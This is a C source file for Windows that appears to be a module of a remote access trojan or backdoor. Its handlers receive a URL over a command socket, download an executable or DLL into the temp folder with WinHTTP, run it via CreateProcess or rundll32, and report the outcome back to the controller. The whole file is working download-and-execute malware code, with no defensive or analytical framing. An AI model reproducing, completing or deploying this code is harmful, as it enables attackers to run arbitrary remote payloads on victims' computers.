#include "rfe.h"
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

static void rfe_send(SOCKET sock, HANDLE mutex, const char* msg) {
    char* buf = malloc(strlen(msg) + 32);
    sprintf(buf, "[rfe_result]%s", msg);
    sock_send(sock, mutex, buf);
    free(buf);
}

static int winhttp_download(const char* url, const char* dest_path) {
    wchar_t wurl[1024];
    MultiByteToWideChar(CP_UTF8, 0, url, -1, wurl, 1024);

    URL_COMPONENTS urlComp = { sizeof(urlComp) };
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;
    urlComp.dwExtraInfoLength = (DWORD)-1;

    if (!WinHttpCrackUrl(wurl, 0, 0, &urlComp)) return 0;

    wchar_t host[256];
    wcsncpy(host, urlComp.lpszHostName, urlComp.dwHostNameLength);
    host[urlComp.dwHostNameLength] = 0;

    HINTERNET hSession = WinHttpOpen(L"client/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return 0;
    HINTERNET hConnect = WinHttpConnect(hSession, host, urlComp.nPort, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return 0; }

    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return 0; }

    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL)) {
        FILE* f = fopen(dest_path, "wb");
        if (f) {
            DWORD size = 0;
            while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
                char* buf = malloc(size);
                DWORD read = 0;
                WinHttpReadData(hRequest, buf, size, &read);
                fwrite(buf, 1, read, f);
                free(buf);
            }
            fclose(f);
            WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
            return 1;
        }
    }
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return 0;
}

void handle_rfe_exe(SOCKET sock, HANDLE mutex, const char* payload) {
    char url[512], args[512];
    const char* sep = strchr(payload, '|');
    if (sep) {
        size_t url_len = sep - payload;
        if (url_len >= sizeof(url)) url_len = sizeof(url) - 1;
        strncpy(url, payload, url_len);
        url[url_len] = 0;
        strncpy(args, sep + 1, sizeof(args) - 1);
        args[sizeof(args) - 1] = 0;
    } else {
        strncpy(url, payload, sizeof(url) - 1);
        url[sizeof(url) - 1] = 0;
        args[0] = 0;
    }

    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    strcat(tmp, "tmp_exe.exe");

    if (!winhttp_download(url, tmp)) {
        rfe_send(sock, mutex, "error:Download failed");
        return;
    }

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    char cmd[1024];
    sprintf(cmd, "\"%s\" %s", tmp, args);
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        rfe_send(sock, mutex, "ok:Execution finished");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        rfe_send(sock, mutex, "error:CreateProcess failed");
    }
    DeleteFileA(tmp);
}

void handle_rfe_dll(SOCKET sock, HANDLE mutex, const char* url) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    strcat(tmp, "tmp_dll.dll");

    if (!winhttp_download(url, tmp)) {
        rfe_send(sock, mutex, "error:Download failed");
        return;
    }

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    char cmd[1024];
    sprintf(cmd, "rundll32.exe \"%s\"", tmp);
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        rfe_send(sock, mutex, "ok:rundll32 started");
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        rfe_send(sock, mutex, "error:rundll32 failed");
    }
}
